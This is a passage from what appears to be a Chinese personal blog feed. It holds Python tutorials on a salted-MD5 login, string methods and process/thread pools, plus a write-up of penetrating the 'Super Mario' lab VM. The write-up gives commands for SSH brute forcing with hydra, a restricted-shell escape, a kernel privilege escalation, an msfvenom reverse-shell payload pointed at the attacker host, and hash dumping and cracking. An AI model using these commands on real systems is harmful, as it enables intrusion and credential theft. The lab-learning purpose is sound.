username:'</span>)</span><br><span class="line">    password = raw_input(<span class="string">'please input your password:'</span>)</span><br><span class="line">    password = Salt_get_md5(password,name)</span><br><span class="line">    <span class="keyword">if</span> dic[name] == password:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Login Success!'</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">print</span> <span class="string">'Login faild! username or password error!'</span></span><br><span class="line">        login()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    ch = raw_input(<span class="string">'请选择1或2:1-&gt;登录，2-&gt;注册'</span>)</span><br><span class="line">    <span class="comment"># print type(ch)</span></span><br><span class="line">    <span class="keyword">if</span> ch == <span class="string">'1'</span>:</span><br><span class="line">        login()</span><br><span class="line">    <span class="keyword">elif</span> ch == <span class="string">'2'</span>:</span><br><span class="line">        username()</span><br><span class="line">        ch = raw_input(<span class="string">'请选择1或2:1-&gt;登录，2-&gt;退出'</span>)</span><br><span class="line">        <span class="keyword">if</span> ch == <span class="string">'1'</span>:</span><br><span class="line">            login()</span><br><span class="line">        <span class="keyword">elif</span> ch ==<span class="string">'2'</span>:</span><br><span class="line">            exit(<span class="string">'bye!!!'</span>)</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
        <tag>hashlib</tag>
      </tags>
  </entry>
  <entry>
    <title>python字符操作</title>
    <url>/2018/08/29/python%E5%AD%97%E7%AC%A6%E6%93%8D%E4%BD%9C/</url>
    <content><![CDATA[<h3 id="字符串操作需求"><a href="#字符串操作需求" class="headerlink" title="字符串操作需求"></a>字符串操作需求</h3><blockquote>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&gt; string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）</span><br><span class="line">&gt; python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：</span><br><span class="line">&gt; 1.python的字符串属性函数</span><br><span class="line">&gt; 2.python的string模块</span><br><span class="line">&gt; 一次python对字符的操作，人生苦短!</span><br><span class="line">&gt;</span><br></pre></td></tr></table></figure>
</blockquote>
<h3 id="文档练习实例如下："><a href="#文档练习实例如下：" class="headerlink" title="文档练习实例如下："></a>文档练习实例如下：</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">string模块定义了一些常用的属性（包含所有的数字，字母，可打印的所有ascii码等）</span></span><br><span class="line"><span class="string">python的字符串操作可以通过两部分的方法函数基本上就可以解决所有的字符串操作需求：</span></span><br><span class="line"><span class="string">1.python的字符串属性函数</span></span><br><span class="line"><span class="string">2.python的string模块</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="comment">#1.字符串输出格式对齐</span></span><br><span class="line"> </span><br><span class="line">str = <span class="string">'PyTHON heLLo'</span></span><br><span class="line"><span class="keyword">print</span> str.center(<span class="number">20</span>)  <span class="comment">#生成20个字符长度，str处于中间位置</span></span><br><span class="line"><span class="keyword">print</span> str.ljust(<span class="number">20</span>)   <span class="comment">#生成20个字符，str左对齐</span></span><br><span class="line"><span class="keyword">print</span> str.rjust(<span class="number">20</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#2.大小写转换</span></span><br><span class="line"><span class="keyword">print</span> str.upper()   <span class="comment">#转大写</span></span><br><span class="line"><span class="keyword">print</span> str.lower()   <span class="comment">#转小写</span></span><br><span class="line"><span class="keyword">print</span> str.capitalize()  <span class="comment">#字符串首字母大写，其余小写</span></span><br><span class="line"><span class="keyword">print</span> str.swapcase()    <span class="comment">#大小写对换</span></span><br><span class="line"><span class="keyword">print</span> str.title()       <span class="comment">#以分隔符为标记，首字符为大写，其余为小写</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#3.字符串判断条件</span></span><br><span class="line">str1 = <span class="string">'01234'</span></span><br><span class="line"><span class="keyword">print</span> str1.isalnum()   <span class="comment">#判断是否全是数字和字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str1.isdigit()   <span class="comment">#判断是否全是数字，并至少有一个字符</span></span><br><span class="line"> </span><br><span class="line">str2 = <span class="string">'string'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str2.isalnum()   <span class="comment">#判断是否全是数字或字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.isalpha()   <span class="comment">#判断是否全是字母，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.islower()   <span class="comment">#判断是否全是小写字母，当全是小写和数字的组合时也会返回True</span></span><br><span class="line"><span class="keyword">print</span> str2.isspace()   <span class="comment">#判断是否全是空白字符，并至少有一个字符</span></span><br><span class="line"><span class="keyword">print</span> str2.isspace()   <span class="comment">#判断是否全是大写，如果全是大写和数字也会返回True</span></span><br><span class="line"><span class="keyword">print</span> str2.istitle()   <span class="comment">#判断是否每个单词的首字母为大写</span></span><br><span class="line"><span class="keyword">print</span> str2.startswith(<span class="string">'str'</span>)  <span class="comment">#判断字符是否以str开头</span></span><br><span class="line"><span class="keyword">print</span> str2.endswith(<span class="string">'ing'</span>)    <span class="comment">#判断字符是否以ing结尾</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#4.字符串搜索定位与替换</span></span><br><span class="line">str3 = <span class="string">'string IEarn'</span></span><br><span class="line"><span class="keyword">print</span> str3.find(<span class="string">'z'</span>) <span class="comment">#查找字符串，没有则返回-1，有则返回查找到的第一个索引</span></span><br><span class="line"><span class="keyword">print</span> str3.rfind(<span class="string">'n'</span>) <span class="comment">#返回索引的最后一次匹配</span></span><br><span class="line"><span class="keyword">print</span> str3.index(<span class="string">'s'</span>) <span class="comment">#没有匹配则报错，如果匹配到则和find类似，返回第一次索引</span></span><br><span class="line"><span class="keyword">print</span> str3.count(<span class="string">'a'</span>) <span class="comment">#返回字符串中匹配的次数</span></span><br><span class="line"><span class="keyword">print</span> str3.replace(<span class="string">'n'</span>,<span class="string">'N'</span>)  <span class="comment">#搜索替换</span></span><br><span class="line"><span class="keyword">print</span> str3.strip(<span class="string">'n'</span>)  <span class="comment">#删除字符串首尾匹配的字符，通常用于默认删除回车符</span></span><br><span class="line"><span class="keyword">print</span> str3.lstrip(<span class="string">'n'</span>) <span class="comment">#左配符</span></span><br><span class="line"><span class="keyword">print</span> str3.rstrip(<span class="string">'n'</span>) <span class="comment">#右配符</span></span><br><span class="line"> </span><br><span class="line">str4 = <span class="string">'tab'</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str4.expandtabs() <span class="comment">#把制表符转换为空格</span></span><br><span class="line"><span class="keyword">print</span> str4.expandtabs(<span class="number">5</span>)<span class="comment">#指定空格数</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"><span class="comment">#5.字符串编码与解码</span></span><br><span class="line"> </span><br><span class="line">str5 = <span class="string">"字符串学习"</span></span><br><span class="line"><span class="keyword">print</span> str5</span><br><span class="line"><span class="keyword">print</span> str5.decode(<span class="string">'utf-8'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#6.字符串分割变换</span></span><br><span class="line"> </span><br><span class="line">str6 = <span class="string">'Learn string'</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span>.join(str6)</span><br><span class="line"> </span><br><span class="line">str7 = [<span class="string">'Learn'</span>,<span class="string">'string'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'-'</span>.join(str7)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str6.split(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.split(<span class="string">'n'</span>,<span class="number">1</span>)</span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> str6.rstrip(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.rsplit(<span class="string">'n'</span>,<span class="number">1</span>)</span><br><span class="line"><span class="keyword">print</span> str6.splitlines()</span><br><span class="line"><span class="keyword">print</span> str6.partition(<span class="string">'n'</span>)</span><br><span class="line"><span class="keyword">print</span> str6.rpartition(<span class="string">'n'</span>)</span><br><span class="line"> </span><br><span class="line"><span class="comment">#7.打印出一些常用的字符</span></span><br><span class="line"><span class="keyword">print</span> string.letters</span><br><span class="line"><span class="keyword">print</span> string.ascii_letters  <span class="comment">#两个都是打印出大小写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.lowercase</span><br><span class="line"><span class="keyword">print</span> string.ascii_lowercase <span class="comment">#打印小写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.uppercase</span><br><span class="line"><span class="keyword">print</span> string.ascii_uppercase <span class="comment">#打印大写字母</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">print</span> string.digits      <span class="comment">#打印十进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.octdigits   <span class="comment">#打印八进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.hexdigits   <span class="comment">#打印十六进制数字</span></span><br><span class="line"><span class="keyword">print</span> string.printable   <span class="comment">#打印数字，大小写字母和特殊字符</span></span><br><span class="line"><span class="keyword">print</span> string.punctuation <span class="comment">#打印特殊字符</span></span><br><span class="line"><span class="keyword">print</span> string.whitespace  <span class="comment">#打印一些如制表符一样的符号</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">#8.string中定义的方法</span></span><br><span class="line"><span class="string">"string.capwords(s, sep=None)是多个字符串方法的组合split(),capitalize(),join()"</span></span><br><span class="line">s = <span class="string">'ahelloaworld'</span></span><br><span class="line"><span class="keyword">print</span> string.capwords(s, <span class="string">'a'</span>)</span><br><span class="line"><span class="comment">#等价于：</span></span><br><span class="line"><span class="keyword">print</span> <span class="string">'a'</span>.join([i.capitalize() <span class="keyword">for</span> i <span class="keyword">in</span> s.split(<span class="string">'a'</span>)])</span><br><span class="line"> </span><br><span class="line"><span class="comment">#实例：生成200的随机优惠券（长度是20位的）</span></span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">key = string.letters + string.digits</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">200</span>):</span><br><span class="line">    k = [random.choice(key) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>)]</span><br><span class="line">    <span class="keyword">print</span> <span class="string">''</span>.join(k)</span><br></pre></td></tr></table></figure>
<h3 id="练习图示："><a href="#练习图示：" class="headerlink" title="练习图示："></a>练习图示：</h3><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1535555956.23.png" alt></p>
]]></content>
      <tags>
        <tag>python</tag>
        <tag>编程</tag>
      </tags>
  </entry>
  <entry>
    <title>超级玛丽靶机渗透</title>
    <url>/2018/08/19/%E9%9D%B6%E6%9C%BA%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h3 id="靶机渗透"><a href="#靶机渗透" class="headerlink" title="靶机渗透"></a>靶机渗透</h3><blockquote>
<p>以前看到一篇关于靶机渗透的文章，看了一下觉得比较有意思，所以下载下来玩了一下。<a href="https://www.anquanke.com/post/id/146527" target="_blank" rel="noopener">原文链接</a></p>
</blockquote>
<h3 id="搭建环境"><a href="#搭建环境" class="headerlink" title="搭建环境"></a>搭建环境</h3><p>靶机IP：192.168.0.105</p>
<p>攻击主机IP：192.168.0.106</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675443.65.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675463.94.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675493.83.png" alt></p>
<h3 id="渗透过程"><a href="#渗透过程" class="headerlink" title="渗透过程"></a>渗透过程</h3><ul>
<li><p>靶机只有一个登陆界面，所以端口扫描来一波</p>
<p><code>nmap.exe -sV -p- -T5 192.168.0.105</code></p>
</li>
<li><p>发现开了22和8180端口，访问一下8180端口，可以访问，就从8180端口入手，发现啥都没有，目录扫描走一波 <code>sudo dirb http://192.168.0.105:8180 /usr/share/dirb/wordlists/big.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534675825.29.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676045.55.png" alt></p>
</li>
<li><p>发现一个vhosts目录，访问以后得到如下信息：发现有服务名，修改本地hosts文件访问一下<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676106.23.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676228.18.png" alt></p>
</li>
<li><p>然后访问[<a href="http://mario.supermariohost.local:8180/" target="_blank" rel="noopener">http://mario.supermariohost.local:8180/</a> 得到如下界面，并没有发现什么有用的信息，再来一次目录扫描（这里说明一下，本来是没有扫到东西的，所以看了一下原文，发现是扫出来的，也许是字典进行了改进，在后文评论中看到马里奥的弟弟是luigi ，emmm。。果然是）<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676343.44.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676499.19.png" alt></p>
</li>
<li><p>访问一下地址：发现一串英文，利用cewl对连接进行爬取然后生成一个自定义的字典 ，这里是对一些单词的提取，针对可能有用的进行提取<code>cewl &lt;http://mario.supermariohost.local:8180/&gt; -d -w /root/Desktop/666.txt</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676681.24.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534676860.62.png" alt></p>
</li>
<li><p>利用生成的自定义字典使用john生成一个自定义的密码字典 <code>john --wordlist=/home/dest/666.txt --stdout --rules &gt; 777.txt</code> 这里联想到前面的那个目录luigi和生成的密码，然后对22端口进行爆破</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677018.46.png" alt></p>
<p><code>hydra -l luigi -P /home/toml/777.txt 192.168.0.105 ssh -t 20</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677247.99.png" alt></p>
</li>
<li><p>得到ssh的账号密码，进行登录，登录成功以后发现shell权限被限制了，和python进行沙盒逃逸挺像的<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677310.05.png" alt></p>
</li>
<li><p>在原文中有一篇关于内网渗透中绕过shell限制的文章：<a href="http://www.4hou.com/penetration/11674.html" target="_blank" rel="noopener">www.4hou.com/penetration/11674.html</a> ，通过awk ‘BEGIN{system(“/bin/bash”)}’ 绕过限制,由于测试过进行总结，所以靶机再没重启<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677502.15.png" alt></p>
</li>
<li><p>然后进行提权：通过查看内核发现是3.13.0的内核版本，通过公开的提权程序进行提权：<a href="https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行" target="_blank" rel="noopener">https://www.exploit-db.com/raw/37292/，下载以后是html,修改后缀名进行编译执行</a> <code>gcc 77.c -o test</code> 拿到root权限</p>
</li>
<li><p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677631.83.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677718.08.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534677870.96.png" alt></p>
</li>
<li><p>提权成功后在root目录下发现了flag.zip,解压发现需要密码：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678061.53.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678103.78.png" alt></p>
</li>
<li><p>将靶机上的flag压缩包下载到本地，利用msf生成后门程序，在靶机上下载执行：</p>
<p><code>sudo msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.0.106 LPORT=7777 -f elf &gt; /var/www/html/5.elf</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678360.95.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678383.77.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678435.94.png" alt></p>
</li>
<li><p>利用fcrackzip爆破压缩包的密码 <code>fcrackzip -u -D -p /usr/share/wordlists/rockyou.txt flag.zip</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678550.51.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678577.38.png" alt></p>
</li>
<li><p>查看flag发现要拿到所有的账户密码，这个时候已经在msf上反弹shell了，所以先把所有的hash抓下来</p>
<p><code>run post/linux/gather/hashdump</code> <img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678687.04.png" alt></p>
</li>
<li><p>然后利用刚才破解的压缩包密码生成字典，将密码保存到一个新的文件夹中，然后生成</p>
<p><code>john --wordlist=/home/toml/newpass.txt --stdout --rules &gt; newpasse.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678803.4.png" alt></p>
</li>
<li><p>加载字典，然后本地破解hash，得到所有的账户密码：</p>
<p><code>john --wordlist=/home/toml/newpasse.txt /home/toml/.msf4/loot/20180819175754_default_192.168.0.105_linux.hashes_331263.txt</code><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534678908.77.png" alt></p>
</li>
<li><p>利用得到的账户密码均登陆成功：渗透完成<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1534679220.15.png" alt></p>
</li>
</ul>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><blockquote>
<p>本次靶机的渗透测试，看了表哥的文章，思路清晰，收获很多，是一次学习的过程。</p>
</blockquote>
]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶机</tag>
      </tags>
  </entry>
  <entry>
    <title>python进程池和线程池</title>
    <url>/2018/06/28/python%E8%BF%9B%E7%A8%8B%E6%B1%A0%E5%92%8C%E7%BA%BF%E7%A8%8B%E6%B1%A0/</url>
    <content><![CDATA[<h2 id="python进程池和线程池学习"><a href="#python进程池和线程池学习" class="headerlink" title="python进程池和线程池学习"></a>python进程池和线程池学习</h2><blockquote>
<p>前几天学习了python的多进程通信，是python标准库中支持的多进程并发模块multiprocessing ，主要学习了它常用的两个类和几种进程间通信的方法，本文基于这一点继续拓展python的并发中的线程池和进程池。</p>
</blockquote>
<h3 id="多进程和多线程"><a href="#多进程和多线程" class="headerlink" title="多进程和多线程"></a>多进程和多线程</h3><blockquote>
<p>按照书上的话来说“进程是资源分配的最小单位，线程是CPU调度的最小单位 ”但在实际中要分清楚它们的区别与联系才可以运用好多线程和多进程。多进程与多线程的区别 进程是程序在计算机上的一次执行活动。当你运行一个程序，你就启动了一个进程。显然，程序是死的(静态的)，进程是活的(动态的)。进程可以分为系统进程和用户进程。凡是用于完成操作系统的各种功能的进程就是系统进程，它们就是处于运行状态下的操作系统本身；所有由你启动的进程都是用户进程。进程是操作系统进行资源分配的单位。在Windows下，进程又被细化为线程，也就是一个进程下有多个能独立运行的更小的单位。 在同一个时间里，同一个计算机系统中如果允许两个或两个以上的进程处于运行状态，这便是多任务。 </p>
</blockquote>
<ul>
<li>先贴一张图来看多线程和多进程再不同维度的对比：<img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530154912.57.png" alt></li>
<li>基于上图总结：<ul>
<li>需要频繁创建销毁的优先使用多线程，常见的是web服务器，来一个请求，建立一次连接、通信结束以后销毁连接，所以要使用多线程，如果使用多进程，创建和销毁的代价非常大。</li>
<li>需要进行大量计算的优先使用多线程，由于大量计算需要消耗大量的CPU资源、切换频繁，如图像处理、算法处理，使用多线程切换简单，CPU的利用率高。</li>
<li>处理关系相关性强的优先用多进程、相关性弱的优先用多线程。比如：服务器进行消息的收发和消息的处理，相关性不是很强，使用多进程可以提高并发速度；针对消息的处理有消息解码、业务处理等多种方式，这个时候需要数据间的共享，使用多线程会提高并发速度。</li>
<li>基于分布式的多核多机的优先使用多进程。</li>
<li>满足不同的需求，结合它们的特性选用合理的方式。</li>
</ul>
</li>
</ul>
<h3 id="通过队列实现多线程和多进程的并发"><a href="#通过队列实现多线程和多进程的并发" class="headerlink" title="通过队列实现多线程和多进程的并发"></a>通过队列实现多线程和多进程的并发</h3><ol>
<li><p>使用multiprocessing.JoinableQueue实现多进程并发</p>
<blockquote>
<p>JoinableQueue是multiprocessing的一种数据结构，它本质上是一个FIFO队列，它与一般队列的不同在于它的多进程是安全的，会自动解决互斥和死锁的问题。JoinableQueue主要可以用来存放执行的任务和收集任务的执行结果。 </p>
</blockquote>
<ul>
<li><p>通过多进程并发打印26个字母</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> multiprocessing <span class="keyword">import</span> JoinableQueue</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">import</span> random, time</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="comment">#这里是多进程并发的要点，q是一个JoinableQueue对象，支持get方法读取第一个元素，如果q中没有元素，进程就会阻塞，直至q中被存入新元素</span></span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"><span class="comment">#通过多进程将26个字母打印出来</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment">#定义一个存放任务的JoinableQueue对象</span></span><br><span class="line">    q = multiprocessing.JoinableQueue()</span><br><span class="line">    <span class="comment">#实例化两个Process对象（每个对象对应一个子进程）target是实现每个任务工作中的具体函数，args是target函数的参数</span></span><br><span class="line">    pw1 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    pw2 = multiprocessing.Process(target=read, args=(q,))</span><br><span class="line">    <span class="comment">#将子进程设为守护进程———在主进程结束后随之结束</span></span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    <span class="comment">#子进程就开始独立于父进程运行了，它会在单独的进程里调用target引用的函数——在这里即read函数，它是一个死循环，将参数q中的数一一读取并打印出来</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="comment">#实际上start执行以后进程就阻塞了，由于JoinableQueue对象没有传入元素，等待传入元素才开始执行</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="comment">#这里是查询q中的数据是否已经读完，如果没有读完阻塞程序，等待q中的数据读完才开始继续执行</span></span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162034.1.png" alt></p>
</li>
<li><p>通过这个实例可以看出python通过JoinableQueue实现多进程并发的优雅</p>
</li>
</ul>
</li>
<li><p>通过队列实现多线程的并发</p>
<blockquote>
<p>程序的实现与多进程差别不大，只是这里不用multiProcessing.JoinableQueue进行队列的操作，一般的队列就可以满足要求</p>
</blockquote>
<ul>
<li><p>通过队列实现多线程并发实例：打印26个字母（代码和多进程的差别并不大）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> time, random</span><br><span class="line"><span class="keyword">import</span> threading, queue</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span><span class="params">(q)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            value = q.get()</span><br><span class="line">            print(<span class="string">'GET &#123;&#125; from queue.'</span>.format(value))</span><br><span class="line">            time.sleep(random.random())</span><br><span class="line">        <span class="keyword">finally</span>:</span><br><span class="line">            q.task_done()</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    q = queue.Queue()</span><br><span class="line">    pw1 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw2 = threading.Thread(target=read, args=(q,))</span><br><span class="line">    pw1.daemon = <span class="keyword">True</span></span><br><span class="line">    pw2.daemon = <span class="keyword">True</span></span><br><span class="line">    pw1.start()</span><br><span class="line">    pw2.start()</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> [chr(ord(<span class="string">'A'</span>)+i) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">26</span>)]:</span><br><span class="line">        q.put(x)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        q.join()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        print(<span class="string">'stopped by hand'</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530162960.12.png" alt></p>
</li>
</ul>
</li>
</ol>
<h3 id="多线程补充"><a href="#多线程补充" class="headerlink" title="多线程补充"></a>多线程补充</h3><blockquote>
<p>既然说到了用队列实现多线程并发，再补充通过threading初始化，不调用队列实现多线程并发，这里要多出一个线程不安全的问题，用线程锁来解决</p>
</blockquote>
<ol>
<li><p>不设计线程锁实例：(以前测试的时候出现线程不安全的问题，现在运行以后没有了，应该是python版本的修复)</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n</span><br><span class="line">        print(n,self.name)</span><br><span class="line">        n += <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">10</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163771.85.png" alt></p>
</li>
<li><p>设计线程锁的实例（尽管现在测试没有出现线程不安全的问题，还是将它作为补充）</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> threading, time</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span><span class="params">(threading.Thread)</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></span><br><span class="line">        threading.Thread.__init__(self)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">run</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">global</span> n, lock</span><br><span class="line">        time.sleep(<span class="number">1</span>)</span><br><span class="line">        <span class="keyword">if</span> lock.acquire():</span><br><span class="line">            print(n , self.name)</span><br><span class="line">            n += <span class="number">1</span></span><br><span class="line">            lock.release()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">"__main__"</span> == __name__:</span><br><span class="line">    n = <span class="number">1</span></span><br><span class="line">    ThreadList = []</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>, <span class="number">200</span>):</span><br><span class="line">        t = MyThread()</span><br><span class="line">        ThreadList.append(t)</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.start()</span><br><span class="line">    <span class="keyword">for</span> t <span class="keyword">in</span> ThreadList:</span><br><span class="line">        t.join()</span><br></pre></td></tr></table></figure>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1530163912.26.png" alt></p>
</li>
</ol>
<h3 id="通过进程池和线程池来实现并发设计"><a href="#通过进程池和线程池来实现并发设计" class="headerlink" title="通过进程池和线程池来实现并发设计"></a>通过进程池和线程池来实现并发设计</h3><blockquote>
<p>通过进程池和线程池实现并发设计，也算是对上一篇多进程学习的补充与应用</p>
</blockquote>
